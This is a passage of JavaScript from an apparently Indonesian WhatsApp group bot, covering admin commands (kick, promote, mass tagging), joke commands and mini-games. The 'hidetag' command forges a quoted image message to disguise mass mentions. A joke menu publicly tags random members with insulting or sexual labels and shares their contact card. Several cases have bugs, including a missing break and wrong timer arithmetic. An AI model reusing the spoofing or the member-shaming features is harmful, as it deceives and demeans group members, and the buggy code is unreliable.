if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`what's the number?`)
try {
num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
client.groupAdd(from, [num])
} catch (e) {
console.log('Error :', e)
reply(`can't add number, looks like it's private`)
}
await confirmLIMIT(sender, [angka])
break
case 'kick':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`reply chat member yang mau di kick`)
if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) return;
if (mek.message.extendedTextMessage.contextInfo.participant === undefined) {
entah = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (entah.length > 1) {
var mems_ids = []
for (let ids of entah) {
mems_ids.push(ids)
}
client.groupRemove(from, mems_ids)
} else {
client.groupRemove(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
client.groupRemove(from, [entah])
}
await confirmLIMIT(sender, [angka])
break
case 'demote':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`reply pesan member yang mau di demote`)
mentionede = mek.message.extendedTextMessage.contextInfo.participant
client.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
await confirmLIMIT(sender, [angka])
break
case 'promote':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isPremium) return replysticker(premiumstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`reply pesan member yang mau di kick`)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply members') 
mentionede = mek.message.extendedTextMessage.contextInfo.participant
client.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
client.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
await confirmLIMIT(sender, [angka])
break
case 'listadmin':
case 'adminlist':
case 'admin':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
teks = `*List admin dari ${groupMetadata.subject}*\n*Total: ${groupAdmins.length}*\n\n`
no = 0
for (let admon of groupAdmins) {
no += 1
teks += `[${no.toString()}] @${admon.split('@')[0]}\n`
}
mentions(teks, groupAdmins, true)
await confirmLIMIT(sender, [angka])
break		
case 'groupinfo':            
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing)
ppUrl = await client.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
client.sendMessage(from, buffergbl, image, {quoted: mek, thumbnail: Buffer.alloc(0), caption: `*➣ NAME* : ${groupName}\n*➣ MEMBER* : ${groupMembers.length}\n*➣ ADMIN* : ${groupAdmins.length}\n*➣ DESK*: ${groupDesc}`})
await confirmLIMIT(sender, [angka])
break
case 'listonline':
case 'here':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
let online = [...Object.keys(client.chats.get(ido).presences), client.user.jid]
client.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, {
quoted: mek,
contextInfo: { mentionedJid: online }
})
await confirmLIMIT(sender, [angka])
break
case 'linkgrup':
case 'linkgc':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
linkgc = await client.groupInviteCode (from)
yeh = `https://chat.whatsapp.com/${linkgc}\n\n*link Group ${groupName}*`
client.sendMessage(from, yeh, text, {quoted: fgif})
await confirmLIMIT(sender, [angka])
break
case 'setppgrup': 
case 'setppgroup': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
media = await client.downloadAndSaveMediaMessage(mek)
await client.updateProfilePicture (from, media, text, {quoted: mek})
client.sendMessage(from, '「  SUKSES  」 Mengubah Profile Grup', text, { quoted: fgclink })
await confirmLIMIT(sender, [angka])
break	
case 'delvote':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
            if(isVote) return reply('Tidak ada sesi Voting')
            delVote(from)
            reply('Sukses Menghapus sesi Voting Di Grup Ini')
            break
case 'voting':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
            if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
            if(!q) return reply('*Voting*\n\n'+ prefix+ 'voting @tag target | reason  | 1 (1 = 1 Menit)')
            if (mek.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || mek.message.extendedTextMessage.contextInfo == null) {
            let id = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
            split = args.join(' ').replace('@', '').split('|')
            if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
            await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
            addVote(from,split[1],split[0],split[2],reply)
            }
            break	
case 'setnamegrup':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.groupUpdateSubject(from, `${body.slice(13)}`)
client.sendMessage(from, '「  SUKSES  」 Mengubah Nama Grup', text, { quoted: fgclink })
await confirmLIMIT(sender, [angka])
break 
case 'setdesc':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.groupUpdateDescription(from, `${body.slice(9)}`)
client.sendMessage(from, '*「  SUKSES  」 Mengubah Desk Grup', text, { quoted: fgclink })
await confirmLIMIT(sender, [angka])
break   
case 'tutuptime': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing) 
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
const close = {
text: `*Grup ditutup oleh admin* @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
contextInfo: { mentionedJid: [nomor] }
}
client.groupSettingChange (from, GroupSettingChange.messageSend, true);
reply(close)
}, timer)
await confirmLIMIT(sender, [angka])
break
case 'bukatime': 
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isBotGroupAdmins) return replysticker(botadmstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isGroupAdmins && !isOwner) return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.updatePresence(from, Presence.composing) 
if (args[1]=="detik") {var timer = args[0]+"000"
} else if (args[1]=="menit") {var timer = args[0]+"0000"
} else if (args[1]=="jam") {var timer = args[0]+"00000"
} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
setTimeout( () => {
var nomor = mek.participant
const open = {
text: `*Grup dibuka oleh admin* @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *semua orang* yang dapat mengirim pesan`,
contextInfo: { mentionedJid: [nomor] }
}
client.groupSettingChange (from, GroupSettingChange.messageSend, false);
reply(open)
}, timer)
await confirmLIMIT(sender, [angka])
break
case 'tagall':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isOwner && !isGroupAdmins)return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
members_id = []
teks = (args.length > 1) ? body.slice(8).trim() : ''
teks += '\n\n'
for (let mem of groupMembers) {
teks += `├❏@${mem.jid.split('@')[0]}\n`
members_id.push(mem.jid)
}
mentions(teks, members_id, true)
await confirmLIMIT(sender, [angka])
break
case 'hidetag':
case '_`':
case '.':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (!isPremium && !isOwner) return replysticker(premiumstc)
if (!isOwner && !isGroupAdmins)return replysticker(adminstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
var value = args.join(' ')
var group = await client.groupMetadata(from)
var member = group['participants']
var mem = []
member.map(async adm => {
mem.push(adm.id.replace('c.us', 's.whatsapp.net'))
})
var optionshidetag = {
text: value,
contextInfo: { mentionedJid: mem },
quoted: mek
}
client.sendMessage(from, optionshidetag, text, { quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "393470602054-1351628616@g.us" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg", "caption": fake, "fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=", "fileLength": "28777", "height": 1080, "width": 1079, "mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=", "fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=", "directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69", "mediaKeyTimestamp": "1610993486", "jpegThumbnail": WMthumb} }  } })
 await confirmLIMIT(sender, [angka])
break
//********** GABUT MENU **********
case 'jadian':
case 'selingkuh':
case 'sahabatan':
case 'musuhan':
case 'pacaran':
case 'kangen':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
jds = []
const jdii = groupMembers
const koss = groupMembers
const akuu = jdii[Math.floor(Math.random() * jdii.length)]
const diaa = koss[Math.floor(Math.random() * koss.length)]
teks = `Ciee.. yang lagi ${command} @${akuu.jid.split('@')[0]} sama️ @${diaa.jid.split('@')[0]} `
jds.push(akuu.jid)
jds.push(diaa.jid)
mentions(teks, jds, true, {quoted : mek})
 await confirmLIMIT(sender, [angka])
break
case 'pendosa':
case 'tercantik':
case 'terpintar':
case 'cupu':
case 'terbodoh':
case 'terganteng':
case 'wibu':
case 'fakboy':
case 'fakgirl':
case 'jomblo':
case 'sadboy':
case 'sadgirl':
case 'beban':
case 'jodohku':
case 'termalas':
case 'gakguna':
case 'sangean':
case 'bokepers':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
jds = []
const jdiidr = groupMembers
const akuutr = jdiidr[Math.floor(Math.random() * jdiidr.length)]
teks = `@${akuutr.jid.split('@')[0]} Dia ${command} di grup ini`
jds.push(akuutr.jid)
mentions(teks, jds, true, {quoted : mek})
const vcardoo = `BEGIN:VCARD\nVERSION:3.0\nFN:${command}\nORG: Paling ${command}\nTEL;type=CELL;type=VOICE;waid=${akuutr.jid.split('@')[0]}:+${akuutr.jid.split('@')[0]}\nEND:VCARD`
client.sendMessage(from, {displayname: "Jeff", vcard: vcardoo}, MessageType.contact, { quoted: fdoc})
await confirmLIMIT(sender, [angka])
break
case 'watak':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
watak = body.slice(1)
wa =["penyayang","pemurah","Pemarah","Pemaaf","Penurut","Baik","baperan","Baik Hati","penyabar","Uwu","top deh, pokoknya","Suka Membantu","Supel","Mudah Bergaul","Sombong","Labil","Optimis","Humoris","Kreatif","penyabar","Minder",", Cari Perhatian","Pendendam","Sulit memaafkan","Perfeksionis","Pesimis","Hard to Please"," Terlalu Sensitif","Negative Attitude ","Penyendiri","Moody","Mandiri","Egois","Ambisius","Helper","Kritis","Bossy","Pembangkang","Jujur","Dermawan","Pelit","Keras Kepala","Keras Kepala","Setia","Pendusta","Bijaksana","Tempramental","Berjiwa Besar"]
const tak = wa[Math.floor(Math.random() * wa.length)]
client.sendMessage(from, 'Jawaban : '+ tak, text, { quoted: mek })
 await confirmLIMIT(sender, [angka])
break 
case 'hobby':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
hobby = body.slice(1)
hob =["Desah Di Game","Ngocokin Doi","Stalking sosmed nya mantan","Kau kan gak punya hobby awokawok","Memasak","Membantu Atok","Mabar","Nobar","Sosmedtan","Membantu Orang lain","Nonton Anime","Nonton Drakor","Naik Motor","Nyanyi","Menari","Bertumbuk","Menggambar","Foto fotoan Ga jelas","Maen Game","Berbicara Sendiri","Nonton Wibu","Memasak","Membantu Atok","Mabar","Nobar","Sosmed an","Membantu Orang lain","Nonton Anime","Nonton Drakor","Naik Motor","Nyanyi","Menari","Bertumbuk","Menggambar","Foto fotoan Ga jelas","Maen Game","Berbicara Sendiri"]
const by = hob[Math.floor(Math.random() * hob.length)]
client.sendMessage(from, 'Jawaban : '+ by, text, { quoted: mek })
 await confirmLIMIT(sender, [angka])
break 
case 'gaycek':
case 'rate':
case 'sangecek':
case 'lesbicek':
case 'gantengcek':
case 'jelekcek':
case 'goblokcek':
case 'nolepcek':
case 'wibucek':
case 'jomblocek':
case 'pakboycek':
case 'pakgirlcek':
case 'halalcek':
case 'haramcek':
case 'cantikcek':
case 'bucincek':
case 'bebancek':
case 'pintarcek':
case 'begocek': 
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.sendMessage(from, `Jawaban : ${date1}%`, text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break
case 'bisakah':
case 'bagaimanakah':
case 'apakah':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`Contoh : ${prefix}${command} pertanyaan kamu`)
bisakah = body.slice(1)
const bisa = ["Ya","Tidak","Ga tau","ga mungkin","bisa jadi","mungkin"]
const keh = bisa[Math.floor(Math.random() * bisa.length)]
client.sendMessage(from, 'Jawaban : '+ keh, text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break
case 'kapankah':
case 'kapan':
if (isBanned) return replysticker(banstc)
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply(`Contoh : ${prefix}${command} pertanyaan kamu`)
client.sendMessage(from, `Jawaban : ${date1} ${lucBulan1} lagi `, text, { quoted: mek })
await confirmLIMIT(sender, [angka])
break
case 'suit':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply('Pilih Batu,Gunting atauKertas')
query = args.join(" ")
const botol = ['Batu','Gunting','Kertas']
const suitcuy = botol[Math.floor(Math.random() * botol.length)]
brow = `
*BOT*
> ${suitcuy}
*KAMU*
> ${query}
`
reply(brow)
await confirmLIMIT(sender, [angka])
break
//MINIGAME LUCMENU
case 'caklontong':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
data = fs.readFileSync('./src/minigameluc/caklontong.js');
cak = JSON.parse(data);
lontong = Math.floor(Math.random() * cak.length);
randKey = cak[lontong];
Pertanyaan = randKey.result.soal
Jawaban = '\n*'+randKey.result.desc +'*'
setTimeout( () => {
client.sendMessage(from, Jawaban, text, {quoted: mek})
}, 30000)
setTimeout( () => {
client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
}, 20000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
}, 2500) // 1000 = 1s
client.sendMessage(from, Pertanyaan, text, {quoted: mek})
await confirmLIMIT(sender, [angka])
break
case 'tebakgambar':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
data = fs.readFileSync('./src/minigameluc/tebakgambar.js');
jsonData = JSON.parse(data);
randIndex = Math.floor(Math.random() * jsonData.length);
randKey = jsonData[randIndex];
randSoal =await getBuffer(randKey.result.soalImg)
setTimeout( () => {
client.sendMessage(from, '*➸ Jawaban :* '+ randKey.result.jawaban +'\n', text, {quoted: mek}) // ur cods
}, 30000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
}, 20000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
}, 2500) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, randSoal, image, { caption: '_Jelaskan Apa Maksud Gambar Ini_', quoted: mek, thumbnail: Buffer.alloc(0) }) // ur cods
}, 0) // 1000 = 1s,
await confirmLIMIT(sender, [angka])
break
case 'family100':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (!isGroup) return replysticker(grupstc)
if (!isEvento) return reply(ind.evento())
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
data = fs.readFileSync('./src/minigameluc/family100.js');
fami = JSON.parse(data);
ly100 = Math.floor(Math.random() * fami.length);
randKey = fami[ly100];
Pertanyaan = randKey.result.soal
setTimeout( () => {
client.sendMessage(from, '*➸ Jawaban :* \n```'+randKey.result.jawaban +'```', text, {quoted: mek}) // ur cods
}, 30000) // 1000 = 1s,
setTimeout( () => {
reply('_Waktu Anda Habis_')
}, 29000)
setTimeout( () => {
client.sendMessage(from, '_10 Detik lagi…_', text) // ur cods
}, 20000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_20 Detik lagi_…', text) // ur cods
}, 10000) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '_30 Detik lagi_…', text) // ur cods
}, 2500) // 1000 = 1s,
setTimeout( () => {
client.sendMessage(from, '*'+ Pertanyaan +'*', text, {quoted: mek }) // ur cods
}, 0) // 1000 = 1s,
await confirmLIMIT(sender, [angka])
case 'delsesi':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isEvento) return reply(ind.evento())
if (!isGroup) return replysticker(grupstc)
if (!isGroupAdmins && !isOwner) return reply('Hanya bisa didelete oleh admin group dan owner bot')
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args[0] === 'ttt') {
delete tictactoe[senderNumber]
fs.writeFileSync("./database/bot/tictactoe.json", JSON.stringify(tictactoe))                        
if (fs.existsSync('./temp/' + from + '.json')) {
fs.unlinkSync('./temp/' + from + '.json')
reply('Berhasil Menghapus Sesi Ttt')
} else {
reply('Tidak ada sesi yang berlangsung')
}
} else {
reply('Pilih')
}
await confirmLIMIT(sender, [angka])
break
case 'tictactoe':
case 'ttt':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isEvento) return reply(ind.evento())
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (mek.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!mek.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (fs.existsSync(`./temp/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesi ttt*, untuk menghapus sesi`)
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
tttSkuy = setTtt(`${from}`)
tttSkuy.status = false
tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
tttSkuy.Y = args[0].replace("@", "");
fs.writeFileSync(`./temp/${from}.json`, JSON.stringify(tttSkuy, null, 2))
starGame = `「 *Memulai Game Tictactoe* 」\n\n•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe \n[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan\n\n_Game tictactoe on_`
client.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
 await confirmLIMIT(sender, [angka])
break
case 'cekhistory':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isEvento) return reply(ind.evento())
if (!isGroup) return replysticker(grupstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
client.sendMessage(from, starGame, text, `\`\`\`「 Status Tictactoe 」\`\`\`\n•> Win : ${checkWin(sender)}\n•> Lose : ${checkLose(sender)}`, {quoted: mek})
await confirmLIMIT(sender, [angka])
break			
case 'leaderboard':
				case 'lb':
				if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
				if (!isGroup) return replysticker(grupstc)
				if (isBanned) return replysticker(banstc)
				_level.sort((a, b) => (a.xp < b.xp) ? 1 : -1)
				uang.sort((a, b) => (a.uang < b.uang) ? 1 : -1)
                let leaderboardlvl = '-----[ *LEADERBOARD LEVEL* ]----\n\n'
                let leaderboarduang = '-----[ *LEADERBOARD UANG* ]----\n\n'
                let nom = 0
                try {
                    for (let i = 0; i < 15; i++) {
                        nom++
                        leaderboardlvl += `*[${nom}]* wa.me/${_level[i].id.replace('@s.whatsapp.net', '')}\n┗⊱ *XP*: ${_level[i].xp} *Level*: ${_level[i].level}\n`
                        leaderboarduang += `*[${nom}]* wa.me/${uang[i].id.replace('@s.whatsapp.net', '')}\n┣⊱ *Uang*: _Rp${uang[i].uang}_\n`
                    }
                    await reply(leaderboardlvl)
                    await reply(leaderboarduang)
                } catch (err) {
                    console.error(err)
                    await reply(`minimal 10 user untuk bisa mengakses database`)
                }
				break


case 'getbio':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if (!isGroup) return replysticker(grupstc)
if (args.length < 1) return reply('tag orangnya')
var yy = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
var p = await client.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("Status Profile Not Found", {quoted : mek})
}
break
case 'getpic':
if (!isRegistered) return sendButtonNotRegis(from, daftar1, daftar2, daftar3, { quoted: mek, contextInfo:{mentionedJid: [numbernye, ow, player]}})
if (isBanned) return replysticker(banstc)
if ( checkLimituser(sender) <= 0) return reply(ind.limitend())
if (args.length < 1) return reply('tag orangnya')
client.updatePresence(from, Presence.composing)
var picuut = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
try {
ppimg = await client.getProfilePicture(`${picuut}`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
buffer = await getBuffer(ppimg)
client.sendMessage(from, buffer, image, {quoted: mek, thumbnail: Buffer.alloc(0)})
break

/*case 'creategroup':
case 'creategrup':
if (!isGroup) return replysticker(grupstc)
if (args.length < 1) return reply(`Penggunaan ${prefix}creategrup nama grup|@tag member`)
argza = arg.split('|')
if (mek.message.extendedTextMessage != undefined){
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
